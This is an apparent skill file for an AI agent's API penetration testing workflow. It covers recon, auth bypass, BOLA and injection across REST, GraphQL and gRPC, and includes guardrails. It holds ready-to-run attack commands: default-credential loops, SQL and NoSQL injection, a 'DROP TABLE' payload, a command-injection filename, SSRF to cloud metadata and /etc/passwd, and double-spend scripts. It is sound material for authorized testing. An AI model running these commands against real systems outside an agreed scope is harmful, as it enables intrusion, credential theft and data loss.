---
name: atest
version: 1.0.1
description: "Lightweight API penetration testing framework for REST, GraphQL, and gRPC targets. 4 focused phases without full infrastructure recon overhead."
tags: [api, rest, graphql, grpc, pentest, authentication, injection]
trigger: "api pentest, api security test, graphql pentest, grpc pentest, rest api test, api-only engagement"
argument-hint: "<command: start|status|resume|next|report|abort|cleanup>"
notes:
  - "v1.1.0: Added time budgets, abandon heuristics, bola_scanner.py, state_manager.py, proven patterns, token acquisition moved to Phase 1 gate"
metadata:
  hermes:
    tags: [api, rest, graphql, grpc, pentest]
    related_skills: [ptest, scode, ctest, mtest, w3hunt]
---

# API-First Penetration Testing Framework

Focused 4-phase workflow for pure API engagements (REST, GraphQL, gRPC) where no web UI or mobile app is in scope. Skips infrastructure recon and goes straight to API-level testing.

## Quick Reference

```
Phases:  1.Scope&Recon → 2.AuthN/AuthZ → 3.Injection&Logic → 4.Reporting
States:  LOCKED → OPEN → PASSED (sequential)
Commands: start | status | next | resume | report | abort | cleanup

Key rules:
  • BOLA/IDOR is #1 API vulnerability — test on EVERY endpoint with IDs
  • Test both horizontal (user→user) and vertical (user→admin) access
  • GraphQL: always try introspection + batching + nested queries
  • Rate limiting bypass: rotate headers, use array params, change HTTP method
  • Every finding needs reproducible curl/request evidence
```

## Architecture

```
Phase 1: Scope & Recon → Phase 2: AuthN/AuthZ → Phase 3: Injection & Logic → Phase 4: Reporting
```

## Commands

| Command | Action |
|---------|--------|
| `start` | Initialize engagement — define API targets, auth mechanism, documentation |
| `status` | Show current phase, progress, findings count |
| `resume` | Resume interrupted engagement from last checkpoint |
| `next` | Advance to next phase (runs exit criteria check) |
| `report` | Generate final report |
| `abort` | Terminate engagement early — records reason, generates partial report |
| `cleanup` | Archive engagement output, remove temporary files |

If no command is given, show current status and suggest next action.

### Command Procedures

**`start`:**
1. Collect: API type, base URLs, documentation, auth mechanism, authorization model, rate limits, rules of engagement.
2. Run `state_manager.init_state(workdir, name, api_type, auth_mechanism, base_urls, ...)` — creates output directory + state.yaml + scope.md + findings-log.md.
3. Begin Phase 1 recon immediately (documentation discovery, endpoint enumeration).
4. Attempt token acquisition before advancing to Phase 2.

**`status`:** Output current phase, gateway states (4 phases), findings count by severity, time elapsed. If no engagement, suggest `start`.

**`resume`:**
1. Read `state.yaml` to determine active phase.
2. **Staleness:** >7 days → re-verify API is still accessible, tokens not expired. >30 days → re-run Phase 1 (APIs change frequently).
3. Report status and suggest next action.

**`next`:**
1. Verify current phase gate is satisfied.
2. If NOT met: list unmet criteria, suggest what to test.
3. If met: update state.yaml, advance phase.
4. Override allowed with justification.

**`abort`:**
1. Record reason in state.yaml, mark remaining phases ABORTED.
2. Generate partial report from existing findings.
3. Run cleanup.

**`cleanup`:**
1. Archive `./atest-output/` to `atest-output-{target}-{date}.tar.gz`.
2. Remove test tokens/credentials you created (keep found credentials as evidence).
3. Print summary: findings by severity, phases completed.

---

## Initialization (`start`)

Collect before testing:

1. **API Type** — REST, GraphQL, gRPC, mixed
2. **Base URLs** — all API endpoints in scope
3. **Documentation** — OpenAPI/Swagger URL, GraphQL introspection, `.proto` files
4. **Authentication** — mechanism (JWT, OAuth, API key, session, mTLS), credentials provided?
5. **Authorization Model** — RBAC, ABAC, tenant isolation, role hierarchy
6. **Rate Limits** — known limits, testing restrictions
7. **Rules of Engagement** — write operations allowed? data creation limits?

Create output directory:

```
./atest-output/
├── state.yaml
├── scope.md
├── findings-log.md
├── phase1-recon/
│   ├── endpoints.md
│   └── auth-flow.md
├── phase2-authz/
├── phase3-injection/
└── report/
```

Write `state.yaml`:

```yaml
engagement:
  name: ""
  started: ""
  api_type: ""  # rest, graphql, grpc, mixed
  auth_mechanism: ""  # jwt, oauth, apikey, session, mtls, none

gateways:
  1_recon: OPEN
  2_authn_authz: LOCKED
  3_injection_logic: LOCKED
  4_reporting: LOCKED

findings_count: 0
current_phase: 1

config:
  base_urls: []
  has_graphql: false
  has_grpc: false
  write_ops_allowed: true
  rate_limit_known: ""
```

---

## API-Type Decision Tree

Your testing priorities shift based on API type. Determine this during initialization:

```
┌─────────────────────────────────────────────────────────────────────┐
│ REST API                                                            │
│ Priority: BOLA/IDOR → Auth bypass → Injection → Mass assignment     │
│ Phase 1: endpoint enumeration (OpenAPI, fuzzing, JS extraction)     │
│ Phase 2: systematic endpoint-by-endpoint BOLA testing               │
│ Phase 3: parameter-level injection on all inputs                    │
├─────────────────────────────────────────────────────────────────────┤
│ GraphQL                                                             │
│ Priority: Introspection → Auth on mutations → Batching/DoS → BOLA  │
│ Phase 1: introspection query (maps entire schema instantly)         │
│ Phase 2: test auth on every mutation, field-level access control    │
│ Phase 3: alias batching, depth attacks, directive abuse             │
├─────────────────────────────────────────────────────────────────────┤
│ gRPC                                                                │
│ Priority: Reflection → Auth per-method → Message manipulation       │
│ Phase 1: server reflection (maps all services/methods)              │
│ Phase 2: test auth on each RPC method independently                 │
│ Phase 3: protobuf field manipulation, type confusion, large msgs   │
├─────────────────────────────────────────────────────────────────────┤
│ Mixed (REST + GraphQL + gRPC)                                       │
│ Priority: GraphQL first (fastest to map), then REST, then gRPC     │
│ Reason: GraphQL introspection gives you the full schema in one      │
│ query — use it to understand the data model, then test REST/gRPC   │
│ endpoints with that knowledge.                                      │
└─────────────────────────────────────────────────────────────────────┘
```

---

## Phase 1: Scope & Recon

### Gate: endpoints mapped, auth flow documented, API surface understood, at least one valid token obtained (or documented as unobtainable)

**Token acquisition is a Phase 1 exit criterion.** You cannot test BOLA/IDOR without a token. Before advancing to Phase 2, you must have:
- ✅ At least one valid authenticated token, OR
- ✅ Documented proof that no token is obtainable (no self-registration, no default creds, no provided creds) — Phase 2 then runs unauthenticated-only testing

**Token Acquisition Attempts (do this BEFORE advancing):**
```bash
# Default credentials
for creds in admin:admin admin:password root:root test:test admin:changeme; do
  user=$(echo $creds | cut -d: -f1); pass=$(echo $creds | cut -d: -f2)
  curl -s "$BASE_URL/api/auth/login" -X POST -H "Content-Type: application/json" \
    -d "{\"username\":\"$user\",\"password\":\"$pass\"}"
done

# Empty/null password (if MinPasswordLength:0 found in config)
curl -s "$BASE_URL/api/auth/login" -X POST -H "Content-Type: application/json" \
  -d '{"username":"admin","password":""}'

# Registration endpoint (self-signup)
for path in /api/auth/register /api/register /api/signup /api/users/create; do
  curl -s "$BASE_URL$path" -X POST -H "Content-Type: application/json" \
    -d '{"username":"pentest@test.com","password":"Test1234!","email":"pentest@test.com"}' \
    -w "\n%{http_code}"
done

# OAuth/OIDC public client flows
# Check /.well-known/openid-configuration for token_endpoint
```

**With docs vs without docs:**
- **With OpenAPI/Swagger/introspection:** Phase 1 takes ~10% of time. Parse the spec, map all endpoints, move quickly to Phase 2. Your job is validation, not discovery.
- **Without docs (blind):** Phase 1 expands to ~25-30% of time. You need: JS bundle extraction, path fuzzing, error-based parameter discovery, response analysis to infer data models. Invest here — you can't test what you haven't found.

**Techniques:**

1. **Documentation Discovery:**
   ```bash
   # OpenAPI/Swagger
   for path in /swagger.json /openapi.json /api-docs /swagger-ui.html /v2/api-docs /v3/api-docs; do
     curl -sk -o /dev/null -w "%{http_code} $path\n" "$BASE_URL$path"
   done

   # GraphQL introspection
   curl -s "$BASE_URL/graphql" -H "Content-Type: application/json" \
     -d '{"query":"{ __schema { queryType { fields { name } } mutationType { fields { name args { name type { name kind ofType { name } } } } } } }"}'

   # gRPC reflection
   grpcurl -plaintext $HOST:$PORT list
   grpcurl -plaintext $HOST:$PORT describe <service>
   ```

2. **Endpoint Enumeration:**
   - Parse OpenAPI spec for all paths + methods
   - Extract from JS bundles if frontend exists
   - Fuzz common API paths: `/api/v1/users`, `/api/v1/admin`, `/internal/`
   - Check for versioning: `/v1/`, `/v2/`, `/v3/` (older versions may lack auth)

3. **Authentication Flow:**
   - Document token lifecycle (obtain → refresh → expire)
   - Identify token type and claims (JWT decode)
   - Map which endpoints require auth vs public
   - Check for API key in headers vs query params

4. **Response Analysis:**
   - Identify data models from responses
   - Note sequential/predictable IDs (IDOR candidates)
   - Check error verbosity (stack traces, internal paths)
   - Document rate limit headers (`X-RateLimit-*`, `Retry-After`)

5. **Error Intelligence:**
   Extract library/framework info from deliberate malformed requests:
   ```bash
   # Type confusion — send wrong types to reveal Go/Java/Python struct info
   curl -s "$BASE_URL/api/login" -X POST -H "Content-Type: application/json" \
     -d '{"username":"admin","password":true}'
   # Look for: "cannot unmarshal bool into Go struct field .password of type string"
   #           "JsonWebTokenError: jwt malformed"
   #           "TypeError: expected string, got int"

   # Missing fields — reveals required parameters
   curl -s "$BASE_URL/api/login" -X POST -H "Content-Type: application/json" -d '{}'

   # Overflow/boundary — reveals validation logic
   curl -s "$BASE_URL/api/login" -X POST -H "Content-Type: application/json" \
     -d '{"username":"'$(python3 -c "print('A'*10000)")'"}'
   ```
   **What to extract:** JWT library name, language/framework, struct field names, internal error codes, validation rules.

6. **Config/Settings Discovery:**
   Many API frameworks expose unauthenticated config endpoints:
   ```bash
   for path in /api/config /api/v0/config/settings /api/settings /config.json \
     /actuator/env /actuator/configprops /.well-known/openid-configuration \
     /api/v1/config /settings /api/info /api/version; do
     resp=$(curl -s -w "|%{http_code}" "$BASE_URL$path" --max-time 5)
     code=$(echo "$resp" | rev | cut -d'|' -f1 | rev)
     [ "$code" != "404" ] && [ "$code" != "000" ] && echo "  $path -> $code"
   done
   ```
   **What to extract:** Auth mechanisms enabled, password policies (MinPasswordLength), feature flags (SelfProvisioning, LoginFormVisible), available backends, version info.

**Reference:** `references/rest-api-patterns.md`, `references/graphql-testing.md`, `references/grpc-testing.md`

---

## Phase 2: Authentication & Authorization

### Gate: auth bypass tested, BOLA/IDOR tested on all object-referencing endpoints, privilege escalation attempted

**First: run proven patterns (10 min) — see `references/proven-patterns.md`**
7 high-hit-rate checks before systematic testing. If any hits → validate and document immediately.

**If CDN-fronted and automated scanning fails in Phase 1:** see ptest `vuln-assessment.md` Section 0 (CDN/WAF-Aware Pre-Check) for manual alternatives.

**Techniques:**

1. **Authentication Bypass:**
   ```bash
   # Remove auth header entirely
   curl -sk "$ENDPOINT"
   # Empty Bearer token
   curl -sk -H "Authorization: Bearer " "$ENDPOINT"
   # JWT none algorithm
   # JWT expired token reuse
   # JWT signature stripping
   ```

2. **JWT Attacks (if JWT):**
   - Algorithm confusion (RS256 → HS256 with public key as secret)
   - `alg: none` bypass
   - Key ID (`kid`) injection (path traversal, SQLi)
   - `jku`/`jwk` header injection
   - Weak secret brute-force: `hashcat -m 16500 jwt.txt wordlist.txt`
   - Expired token acceptance
   - Cross-tenant token reuse

3. **BOLA/IDOR:**
   ```bash
   # For every endpoint with an object reference:
   # Test horizontal access (user A's token → user B's resource)
   curl -sk -H "Authorization: Bearer $TOKEN_A" "$BASE_URL/api/users/$USER_B_ID"
   # Test with different ID formats: numeric, UUID, encoded
   # Test collection endpoints: /api/users (returns all?)
   ```

4. **Privilege Escalation:**
   - Vertical: regular user → admin endpoints
   - Role parameter injection: `{"role": "admin"}` in registration/update
   - Function-level: access admin functions with user token
   - Tenant isolation: cross-tenant data access

5. **OAuth Flows (if OAuth):**
   - `redirect_uri` manipulation
   - Authorization code reuse
   - PKCE bypass (downgrade to no PKCE)
   - Token exchange abuse
   - Client credential theft

6. **Response Diffing (systematic BOLA/data exposure detection):**
   For every endpoint with object references, compare responses across roles:
   ```bash
   # Capture responses for same resource with different auth levels
   curl -sk -H "Authorization: Bearer $ADMIN_TOKEN" "$BASE_URL/api/users/123" > /tmp/resp_admin.json
   curl -sk -H "Authorization: Bearer $USER_TOKEN" "$BASE_URL/api/users/123" > /tmp/resp_user.json
   curl -sk "$BASE_URL/api/users/123" > /tmp/resp_unauth.json

   # Diff field count (data exposure = admin sees more fields)
   echo "Admin fields: $(jq 'keys | length' /tmp/resp_admin.json)"
   echo "User fields:  $(jq 'keys | length' /tmp/resp_user.json)"
   echo "Unauth fields: $(jq 'keys | length' /tmp/resp_unauth.json)"

   # Diff content (BOLA = user A can read user B's data)
   curl -sk -H "Authorization: Bearer $USER_A_TOKEN" "$BASE_URL/api/users/$USER_B_ID" > /tmp/resp_cross.json
   [ "$(jq -r '.id' /tmp/resp_cross.json)" = "$USER_B_ID" ] && echo "BOLA CONFIRMED"
   ```
   **Pattern:** Run this on every object-referencing endpoint. Fastest way to find BOLA at scale.

7. **Rate Limiting:**
   ```bash
   # Test rate limit enforcement
   for i in $(seq 1 100); do
     curl -sk -o /dev/null -w "%{http_code}\n" -H "Authorization: Bearer $TOKEN" "$ENDPOINT"
   done | sort | uniq -c
   # Bypass attempts: IP rotation headers, different auth tokens, path case variation
   ```

**Reference:** `references/api-auth-bypass.md`

**Cross-reference:** ptest `references/jwt-attack-techniques.md`, `references/oauth-sso-attack-chains.md`

**Cross-skill triggers from atest:**
- SSRF found → invoke `ctest` Phase 3 (cloud metadata, internal services)
- Cloud storage URLs in responses → invoke `ctest` Phase 3 (S3/GCS/Blob misconfig)
- API serves mobile app → invoke `mtest` if app not yet tested
- Smart contract interaction via API → invoke `w3hunt`
- Source code leaked via error/debug → invoke `scode`
- Geo-blocked endpoints → see ptest `references/geo-restriction-bypass.md`

**OpenAPI/Swagger discovery (MANDATORY in Phase 1):**
- Check standard paths: `/docs`, `/swagger`, `/openapi.json`, `/api-docs`, `/swagger.json`
- **JS bundle extraction:** Modern SPAs often embed the full OpenAPI spec in JS bundles. Search for `openapi` in JS filenames: `curl -s https://target/ | grep -oE '/static/js/openapi[^"]+\.js'` — then extract all `url:"..."` patterns. This revealed 494 endpoints on Wallet on Telegram in seconds.
- Telegram Mini Apps: see ptest `references/telegram-webapp-auth.md` for auth patterns

**CORS Testing (MANDATORY):**
```bash
# Origin reflection test
curl -sk -H "Origin: https://evil.com" -I "$BASE_URL/api/users" | grep -i "access-control"
# Null origin bypass
curl -sk -H "Origin: null" -I "$BASE_URL/api/users" | grep -i "access-control"
# Subdomain wildcard
curl -sk -H "Origin: https://attacker.target.com" -I "$BASE_URL/api/users" | grep -i "access-control"
```
If `Access-Control-Allow-Origin` reflects attacker origin + `Access-Control-Allow-Credentials: true` → High (credential theft via CORS). If reflects but no credentials → Medium (data leakage only).

---

## Phase 3: Injection & Logic

### Gate: injection tested on all input parameters, business logic flaws assessed, race conditions tested where applicable

**Prioritization (limited time? hit these in order):**
1. **Injection on auth endpoints** — SQLi/NoSQLi on login, registration, password reset (highest impact: auth bypass)
2. **Mass assignment on user creation/update** — role escalation via extra fields (quick win, high impact)
3. **Business logic on financial/state-changing operations** — double-spend, negative values, step skipping
4. **SSRF on URL-accepting parameters** — fetch, webhook, import endpoints (cloud metadata = Critical)
5. **Race conditions on limited resources** — only if financial/inventory operations exist
6. **Data exposure on list endpoints** — pagination bypass, over-fetching (usually Medium)

**Techniques:**

1. **Mass Assignment:**
   ```bash
   # Add unexpected fields to creation/update requests
   curl -sk -X POST "$BASE_URL/api/users" -H "Content-Type: application/json" \
     -d '{"name":"test","email":"test@test.com","role":"admin","is_verified":true,"balance":99999}'
   # Check which fields were accepted
   ```

2. **Injection:**
   ```bash
   # SQL injection
   curl -sk "$BASE_URL/api/users?id=1' OR '1'='1"
   curl -sk "$BASE_URL/api/users?sort=name;DROP TABLE users--"

   # NoSQL injection (MongoDB)
   curl -sk -X POST "$BASE_URL/api/login" -H "Content-Type: application/json" \
     -d '{"username":{"$gt":""},"password":{"$gt":""}}'

   # Command injection (in processing endpoints)
   curl -sk -X POST "$BASE_URL/api/convert" -d '{"filename":"test;id;.pdf"}'

   # SSRF (in URL parameters)
   curl -sk "$BASE_URL/api/fetch?url=http://169.254.169.254/latest/meta-data/"
   # AWS IMDSv2
   curl -sk "$BASE_URL/api/fetch?url=http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
   # GCP metadata
   curl -sk "$BASE_URL/api/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
   # Azure metadata
   curl -sk "$BASE_URL/api/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"
   # Internal network scan
   curl -sk "$BASE_URL/api/fetch?url=http://127.0.0.1:8080/actuator/env"
   # DNS rebinding / protocol smuggling
   curl -sk "$BASE_URL/api/fetch?url=file:///etc/passwd"
   curl -sk "$BASE_URL/api/fetch?url=gopher://127.0.0.1:6379/_INFO"
   ```

3. **GraphQL-Specific:**
   ```bash
   # Alias-based batching (amplification)
   curl -s "$BASE_URL/graphql" -H "Content-Type: application/json" \
     -d '{"query":"mutation { a:createUser(input:{name:\"t1\"}) { id } b:createUser(input:{name:\"t2\"}) { id } }"}'

   # Nested query DoS (depth attack)
   curl -s "$BASE_URL/graphql" -H "Content-Type: application/json" \
     -d '{"query":"{ users { posts { comments { author { posts { comments { author { name } } } } } } } }"}'

   # Field suggestion exploitation
   curl -s "$BASE_URL/graphql" -H "Content-Type: application/json" \
     -d '{"query":"{ __type(name:\"User\") { fields { name type { name } } } }"}'
   ```

4. **Business Logic:**
   - Negative values in financial operations
   - Step skipping in multi-step workflows
   - Parallel requests for race conditions (double-spend)
   - Coupon/promo code reuse
   - Quantity manipulation (0, -1, MAX_INT)
   - State machine violations (cancel after ship, refund after refund)

5. **Race Conditions:**
   ```bash
   # Parallel requests for double-spend
   seq 1 10 | xargs -P10 -I{} curl -sk -X POST "$BASE_URL/api/transfer" \
     -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
     -d '{"to":"attacker","amount":1000}'
   ```

6. **Data Exposure:**
   - Excessive data in responses (PII, internal IDs, debug info)
   - Different response sizes for valid vs invalid resources (enumeration)
   - Error messages leaking implementation details
   - Pagination bypass (requesting page_size=99999)

7. **API Versioning Exploitation:**
   ```bash
   # Discover available versions
   for v in v0 v1 v2 v3 v4 beta internal legacy; do
     code=$(curl -sk -o /dev/null -w "%{http_code}" "$BASE_URL/api/$v/users")
     [ "$code" != "404" ] && echo "  /api/$v/ -> $code"
   done

   # Compare auth enforcement across versions
   # Older versions often lack auth checks added later
   curl -sk "$BASE_URL/api/v1/admin/users"  # 401
   curl -sk "$BASE_URL/api/v0/admin/users"  # 200? Auth bypass via version downgrade

   # Check for deprecated endpoints still accessible
   # If OpenAPI spec shows removed endpoints, test them on older version prefixes
   ```
   **What to look for:** Auth bypass on older versions, removed-but-accessible admin endpoints, different validation rules (v1 validates input, v0 doesn't).

8. **WebSocket / SSE / Streaming:**
   ```bash
   # WebSocket discovery
   # Check for Upgrade: websocket in responses, or /ws /socket /realtime paths
   # Common frameworks: Socket.IO (/socket.io/?EIO=4&transport=polling), SignalR (/hub)

   # WebSocket auth bypass
   # Many WS endpoints check auth only on HTTP upgrade, not on subsequent messages
   websocat ws://target.com/ws -H "Authorization: Bearer $TOKEN"
   # After connection: try sending messages without re-authenticating

   # WS message injection (if no per-message auth)
   echo '{"action":"admin.listUsers"}' | websocat ws://target.com/ws

   # SSE subscription abuse
   curl -sk -N -H "Authorization: Bearer $USER_TOKEN" "$BASE_URL/api/events/stream"
   # Check: can you subscribe to other users' event streams?
   # Check: does the stream leak data from other tenants?

   # Streaming gRPC
   grpcurl -plaintext -d '{"user_id":"OTHER_USER"}' $HOST:$PORT service/StreamEvents
   # Server-streaming: can you receive other users' events?
   # Client-streaming: can you inject messages into other sessions?
   ```
   **Key patterns:** Auth checked on connect but not per-message, subscription to other users' channels, event replay (resend old message IDs), no rate limiting on WS messages.

9. **gRPC-Specific:**
   ```bash
   # Message manipulation
   grpcurl -plaintext -d '{"user_id": "OTHER_USER"}' $HOST:$PORT service/GetProfile
   # Reflection-based enumeration
   grpcurl -plaintext $HOST:$PORT list
   # Large message DoS
   grpcurl -plaintext -d '{"data": "'$(python3 -c "print('A'*1000000)")'" }' $HOST:$PORT service/Process
   ```

**Reference:** `references/graphql-testing.md`, `references/grpc-testing.md`

---

## Phase 4: Reporting

### Pre-Report: Chain & Escalate

Before writing the report, revisit all findings and attempt to chain them for higher severity. See ptest `references/chain-and-escalate-phase.md` for the full protocol. Quick checklist:
- [ ] Can any Info/Low finding be combined with another to escalate impact?
- [ ] Do error messages reveal info that enables attacks on other endpoints?
- [ ] Do config leaks (password policy, auth mechanism) make brute-force viable?
- [ ] Can exposed API docs map authenticated attack surface for future testing?

### Gate: report delivered with all findings documented and PoCs included

**Report Structure:**

```markdown
# API Penetration Test Report — {Target}

## 1. Executive Summary
- API type, endpoints tested, auth mechanism
- Severity breakdown
- Top risk and business impact

## 2. Scope & Methodology
- Base URLs, API version, documentation source
- 4-phase methodology with status
- Tools used, testing constraints

## 3. API Surface Map
- Endpoint inventory (method, path, auth required, parameters)
- Data models identified
- Auth flow diagram

## 4. Findings Summary
| ID | Title | Severity | Category | Endpoint |

## 5. Detailed Findings
- Each finding with: description, endpoint, request/response, impact, remediation

## 6. Remediation Roadmap
- Immediate: auth bypass, injection fixes
- Short-term: BOLA fixes, rate limiting
- Medium-term: architecture improvements

## Appendix: PoC Scripts
- curl commands for each finding
- Race condition scripts
- Token manipulation examples
```

---

## Finding Template

```markdown
## [ATEST-{ID}] {Title}

**Severity:** Critical / High / Medium / Low / Info
**Category:** AuthN / AuthZ / Injection / Logic / Data Exposure / DoS
**Endpoint:** `{METHOD} {path}`
**Parameter:** {affected parameter}

### Description
{What the vulnerability is}

### Request
```http
{Full HTTP request}
`` `

### Response
```http
{Relevant response showing the issue}
`` `

### Impact
{What an attacker can achieve}

### Remediation
{Specific fix}
```

---

## Mandatory Checks

| Category | Minimum Tests |
|----------|--------------|
| Auth Bypass | Remove token, empty token, expired token, wrong tenant token |
| BOLA | Every endpoint with object reference tested cross-user |
| Mass Assignment | Every POST/PUT/PATCH tested with extra fields |
| Injection | Top 3 input parameters per endpoint tested for SQLi/NoSQLi |
| Rate Limiting | Auth endpoints + sensitive operations tested |
| Data Exposure | All list endpoints checked for over-fetching |

---

## Effort Allocation

| Phase | % | 4-hour engagement | 8-hour engagement | Rationale |
|-------|---|-------------------|-------------------|-----------|
| 1 Recon | 15% | 35 min | 70 min | API surface mapping |
| 2 AuthN/AuthZ | 40% | 100 min | 190 min | Highest-value — BOLA is #1 API risk |
| 3 Injection & Logic | 30% | 75 min | 145 min | Broad testing surface |
| 4 Reporting | 15% | 35 min | 75 min | Write-up + PoCs |

## Abandon & Pivot Heuristics

**Phase 1 (Recon):**
- No API docs found after 20 min → switch to blind enumeration (fuzz top 50 paths)
- API returns 403 on everything → check if auth is required first (move token acquisition up)
- Can't get a valid token after 15 min → document as blocker, test unauth-only in Phase 2

**Phase 2 (AuthN/AuthZ):**
- No BOLA after testing 20+ endpoints → stop BOLA, shift remaining time to injection
- All endpoints enforce auth correctly → document "auth hardened", move to Phase 3 early
- JWT is properly validated (no none/HS256 confusion, short expiry, proper signature) → skip JWT attacks after 10 min, focus on BOLA/privilege escalation

**Phase 3 (Injection & Logic):**
- No injection after testing top 10 input parameters → stop broad injection, focus on business logic only
- WAF blocking all payloads → try 3 bypass techniques max, then document WAF and move on
- No business logic flaws after 30 min → wrap up, move to reporting

**Global abandon rules:**
- **75% of time budget spent, zero findings** → stop testing, write "hardened" report
- **Critical/High found early** → validate PoC immediately, write it up, then continue testing remaining surface
- **Rate limited / IP blocked** → wait 10 min, retry once. If persistent, document and report with partial results

**Pivot triggers:**
- SSRF confirmed → pivot to cloud metadata (169.254.169.254) before continuing API tests
- Unauth GraphQL mutations found → stop other testing, enumerate all mutations, test each
- Config endpoint leaks credentials → use them immediately for privilege escalation before they rotate

---

## Guardrails

- **Write Operations** — confirm with operator before creating/modifying data. Use obviously-fake test data (`PENTEST-PROBE-*`).
- **Rate Limits** — if you trigger a rate limit, back off. Document the limit as a finding if it's too permissive, not as a blocker.
- **Production Data** — never exfiltrate real user data beyond what's needed to prove the finding. Redact PII in report screenshots.
- **Scope Enforcement** — only test documented endpoints. If you discover undocumented internal APIs, confirm they're in scope before testing.
- **No Destructive Operations** — don't DELETE production resources unless explicitly authorized. Prove DELETE works via 400/405 response analysis (see ptest Write Access Response Protocol).
- **GraphQL Depth** — don't crash the server with unbounded nested queries. Test with depth 5-7, document if no depth limit exists.

---

## Script Invocation

Scripts are in `~/.hermes/skills/security/atest/scripts/`. Invoke via `execute_code`.

**state_manager.py — engagement lifecycle:**
```python
from hermes_tools import terminal
import sys, os
sys.path.insert(0, os.path.expanduser("~/.hermes/skills/security/atest/scripts"))
import state_manager

workdir = "."  # or specific project directory

# Initialize
state_manager.init_state(workdir, "Target API", api_type="rest", auth_mechanism="jwt",
    base_urls=["https://api.target.com"], has_graphql=True)

# Check status
state_manager.status(workdir)

# Advance phase
state_manager.advance_phase(workdir)

# Add finding
state_manager.add_finding(workdir, "ATEST-001", "BOLA on /api/users/{id}", "High", "AuthZ", "GET /api/users/{id}")

# Check abandon
should, reason = state_manager.should_abandon(workdir, budget_hours=4)

# Abandon
state_manager.abandon(workdir, "75% budget, zero findings")
```

**bola_scanner.py — systematic BOLA/IDOR testing:**
```python
from hermes_tools import terminal
import sys, os
sys.path.insert(0, os.path.expanduser("~/.hermes/skills/security/atest/scripts"))
import bola_scanner

# Manual endpoint list
results = bola_scanner.scan(
    base_url="https://api.target.com",
    endpoints=[
        {"method": "GET", "path": "/api/users/{id}"},
        {"method": "GET", "path": "/api/orders/{id}"},
        {"method": "PUT", "path": "/api/users/{id}", "body": {"name": "test"}},
    ],
    token_a="eyJ...",       # User A's token
    token_b="eyJ...",       # User B's token
    user_a_id="123",        # User A's resource ID
    user_b_id="456",        # User B's resource ID
)

# Or from OpenAPI spec (auto-extracts endpoints with path params)
results = bola_scanner.scan_from_openapi(
    base_url="https://api.target.com",
    openapi_path="/tmp/openapi.json",
    token_a="eyJ...",
    token_b="eyJ...",
    user_a_id="123",
    user_b_id="456",
)
print(results["summary"])
```
